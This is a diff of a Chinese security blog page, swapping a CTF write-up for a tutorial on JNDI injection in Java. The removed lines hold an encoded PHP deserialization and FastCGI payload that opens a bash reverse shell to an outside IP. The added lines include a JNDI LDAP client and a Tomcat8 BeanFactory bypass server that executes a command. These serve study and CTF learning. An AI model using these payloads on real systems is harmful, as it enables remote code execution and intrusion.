-<pre class="language-txt" data-language="txt"><code class="language-txt">code&#x3D;O%3A6%3A%22Bypass%22%3A2%3A%7Bs%3A4%3A%22test%22%3BO%3A4%3A%22Esle%22%3A0%3A%7B%7Ds%3A4%3A%22str4%22%3BO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A5%3A%22Bunny%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A33%3A%22ftp%3A%2F%2Faaa%40117.XX.XXX.XXX%3A5002%2F123%22%3B%7D%7D%7D&amp;data&#x3D;%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;117.XX.XXX.XXX&#x2F;5001%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</code></pre>
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
 
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9/image-20220513135416159.png" alt="image-20220513135416159"></p>
+public class JNDILDAPClient &#123;
+    public static void main(String[] args) throws NamingException &#123;
+        InitialContext initialContext&#x3D;new InitialContext();
+        initialContext.lookup(&quot;ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F;a&quot;);&#x2F;&#x2F;后边无所谓，只要有东西就行，应该是服务器脚本给自动做了处理
+
+    &#125;
+&#125;</code></pre>
+
+<p>然后本地起个python服务执行就能弹出计算器了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523213258156.png" alt="image-20230523213258156"></p>
+<p>同样跟一下执行流程</p>
+<p>其实感觉没啥好跟的</p>
+<p>首先就是一路lookup，到Obj这个类里</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523214818421.png" alt="image-20230523214818421"></p>
+<p>然后在decodeObject判断绑定的是个什么东西，这里我们是个引用类型的，所以就进decodeReference了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523214947417.png" alt="image-20230523214947417"></p>
+<p>在decodeReference里就把引用里的东西解出来</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523215743172.png" alt="image-20230523215743172"></p>
+<p>解出来之后就在LdapCtx去加载这里面的东西</p>
+<p>调用<code>DirectoryManager.getObjectInstance</code></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523215303383.png" alt="image-20230523215303383"></p>
+<p>然后在这里面又调用了NamingManager#getObjectFactoryFromReference，去获取工厂地址。后面就和基于RMI的一模一样了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523215449562.png" alt="image-20230523215449562"></p>
+<p>在getObjectFactoryFromReference里加载类，然后实例化</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523215648836.png" alt="image-20230523215648836"></p>
+<p>可以看到，这两种不同的方法，其实际目的都是为了调用NamingManager#getObjectFactoryFromReference，然后去远程加载恶意的字节码文件。</p>
+<p>不过在6u211以后 、7u201以后 、8u191以后 和11.0.1以后的版本中，也修复了这个漏洞，这个在之后高版本绕过的部分再说。</p>
+<h2 id="基于DNS"><a href="#基于DNS" class="headerlink" title="基于DNS"></a>基于DNS</h2><p>这个实际上并不是作为攻击的手段，而是作为一种探测手段</p>
+<p>之前我们说过，JNDI注入的前提是存在一个lookup方法，且其中的url可控</p>
+<p>其攻击过程为</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523220902045.png" alt="image-20230523220902045"></p>
+<p>所以如果直接使用RMI或者LDAP来测试是否存在JNDI注入，会比较繁琐，且有可能暴露自己的服务端，有被反打的可能，所以这时候就可以先用dns来测试一下。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523222520958.png" alt="image-20230523222520958"></p>
+<p>不过即使收到请求也不一定就是有JNDI注入，比如JDK版本、防火墙之类的也会限制漏洞利用</p>
+<h2 id="基于CORBA"><a href="#基于CORBA" class="headerlink" title="基于CORBA"></a>基于CORBA</h2><p>本来以为这玩意没法用的，不过看见了这么一篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://thonsun.github.io/2020/12/02/jndi-zhu-ru-li-yong-fen-xi/#toc-heading-8">https://thonsun.github.io/2020/12/02/jndi-zhu-ru-li-yong-fen-xi/#toc-heading-8</a></p>
+<p>不过这个利用条件过于苛刻了，所以不复现了，当了解。</p>
+<h1 id="高版本绕过"><a href="#高版本绕过" class="headerlink" title="高版本绕过"></a>高版本绕过</h1><p>在高版本的jdk中，把LDAP的路也堵上了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523223314891.png" alt="image-20230523223314891"></p>
+<p>堵的方法就是在最后一步，加载类字节码之前判断trustURLCodebase，只有为true的时候才能进行远程的类加载</p>
+<p>这也就代表着无依赖的JNDI注入彻底结束了。</p>
+<p>因为在低版本中，我们不需要去依赖什么，就可以借助JNDI注入来RCE，但是高版本就需要依赖一些其他的包了，因为既然不让远程加载恶意字节码，那我加载点本地自带的然后把它实例化总可以吧。</p>
+<p>而根据getObjectFactoryFromReference这里类加载的部分可以很容易知道，如果想进行实例化，那这个类必须是个ObjectFactory类型</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523225936975.png" alt="image-20230523225936975"></p>
+<p>ObjectFactory是个接口，所以我们的目标就是找个实现了这个接口的类</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523230218212.png" alt="image-20230523230218212"></p>
+<h2 id="基于Tomcat8的绕过"><a href="#基于Tomcat8的绕过" class="headerlink" title="基于Tomcat8的绕过"></a>基于Tomcat8的绕过</h2><p>tomcat8的<code>org.apache.naming.factory.BeanFactory</code>就很适合作为我们加载的类。而且由于它在tomcat8的依赖里，那么攻击面和利用条件也是很可观的。</p>
+<p><code>org.apache.naming.factory.BeanFactory</code> 在 <code>getObjectInstance() </code>中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523231143324.png" alt="image-20230523231143324"></p>
+<p>bean</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523231252326.png" alt="image-20230523231252326"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523231301639.png" alt="image-20230523231301639"></p>
+<p>也就是前边说的<code>实例化Reference所指向的任意Bean Class</code></p>
+<p>valueArray</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230523231543939.png" alt="image-20230523231543939"></p>
+<p>添加依赖</p>
+<pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.tomcat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>tomcat-catalina<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>8.5.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.lucee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre>
+
+<p>bypass的代码</p>
+<pre class="language-java" data-language="java"><code class="language-java">import com.sun.jndi.rmi.registry.ReferenceWrapper;  &#x2F;&#x2F; 导入 ReferenceWrapper 类，用于包装引用对象
+import org.apache.naming.ResourceRef;  &#x2F;&#x2F; 导入 ResourceRef 类，用于创建资源引用对象
+ 
+import javax.naming.StringRefAddr;  &#x2F;&#x2F; 导入 StringRefAddr 类，用于创建字符串引用地址对象
+import java.rmi.registry.LocateRegistry;  &#x2F;&#x2F; 导入 LocateRegistry 类，用于定位 RMI 注册表
+import java.rmi.registry.Registry;  &#x2F;&#x2F; 导入 Registry 类，用于操作 RMI 注册表
+
+public class RMI_Server_ByPass &#123;
+    public static void main(String[] args) throws Exception &#123;
+        Registry registry &#x3D; LocateRegistry.createRegistry(1099);  &#x2F;&#x2F; 创建 RMI 注册表对象并监听指定端口（1099）
+        ResourceRef resourceRef &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, (String)null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, (String)null);
+        &#x2F;&#x2F; 创建 ResourceRef 对象，表示一个资源引用，参数依次为类名、类工厂位置、工厂位置、工厂对象实例化标志、工厂类名、工厂对象实例化位置
+        resourceRef.add(new StringRefAddr(&quot;forceString&quot;, &quot;faster&#x3D;eval&quot;));  &#x2F;&#x2F; 添加字符串引用地址对象到 ResourceRef 对象中，参数为引用地址类型和引用地址值
+        resourceRef.add(new StringRefAddr(&quot;faster&quot;, &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;));  &#x2F;&#x2F; 添加字符串引用地址对象到 ResourceRef 对象中，参数为引用地址类型和引用地址值
+        ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(resourceRef);  &#x2F;&#x2F; 使用 ResourceRef 对象创建 ReferenceWrapper 对象，用于包装引用对象
+        registry.bind(&quot;Tomcat8bypass&quot;, referenceWrapper);  &#x2F;&#x2F; 在 RMI 注册表中绑定 ReferenceWrapper 对象，参数为绑定的名称和要绑定的对象
+        System.out.println(&quot;Registry运行中......&quot;);  &#x2F;&#x2F; 输出信息到控制台，表示 RMI 注册表运行中
+    &#125;
+&#125;</code></pre>
+
+<p>其实就是按照BeanFactory的要求来构造的</p>
+<p>然后被攻击的客户端就正常代码，不过要在tomcat8环境下</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/">https://boogipop.com/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ne4y1o7ch/?vd_source=053f03b424a45370bc5813843ae5268f">红队攻击手特训营-JNDI注入漏洞挖掘_哔哩哔哩_bilibili</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1JY411F7mA/">从文档开始的jndi注入之路-2 jndi+ldap绕过_哔哩哔哩_bilibili</a></p>
 
                 
             </div>
@@ -1537,7 +997,7 @@ echo urlencode(serialize($a));</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/">https://Ethe448.github.io/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/</a>
+                    <a href="https://Ethe448.github.io/2023/05/22/JNDI%E6%B3%A8%E5%85%A5/">https://Ethe448.github.io/2023/05/22/JNDI%E6%B3%A8%E5%85%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1575,8 +1035,12 @@ echo urlencode(serialize($a));</code></pre>
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/ctf/">
-                                    <span class="chip bg-color">ctf</span>
+                                <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">web学习</span>
+                                </a>
+                            
+                                <a href="/tags/Java/">
+                                    <span class="chip bg-color">Java</span>
                                 </a>
                             
                         </div>
@@ -2016,17 +1480,18 @@ echo urlencode(serialize($a));</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/05/20/520%E8%BF%8E%E6%96%B0%E8%B5%9Bwp/">
+                <a href="/2023/05/22/JNDI%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/7.jpg" class="responsive-img" alt="dest0g3 520迎新赛wp">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/1.jpg" class="responsive-img" alt="JNDI注入">
                         
-                        <span class="card-title">dest0g3 520迎新赛wp</span>
+                        <span class="card-title">JNDI注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -2036,9 +1501,9 @@ echo urlencode(serialize($a));</code></pre>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-20
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -2047,11 +1512,16 @@ echo urlencode(serialize($a));</code></pre>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">web学习</span>
+                    </a>
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
                     </a>
                     
                 </div>
@@ -2065,13 +1535,13 @@ echo urlencode(serialize($a));</code></pre>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/04/26/ssrf/">
+                <a href="/2023/05/20/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%89%EF%BC%89/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/16.jpg" class="responsive-img" alt="ssrf">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/1.jpg" class="responsive-img" alt="RMI攻击（三）">
                         
-                        <span class="card-title">ssrf</span>
+                        <span class="card-title">RMI攻击（三）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -2082,7 +1552,7 @@ echo urlencode(serialize($a));</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-20
                             </span>
                         <span class="publish-author">
                             
@@ -2099,8 +1569,8 @@ echo urlencode(serialize($a));</code></pre>
                         <span class="chip bg-color">web学习</span>
                     </a>
                     
-                    <a href="/tags/ssrf/">
-                        <span class="chip bg-color">ssrf</span>
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
                     </a>
                     
                 </div>
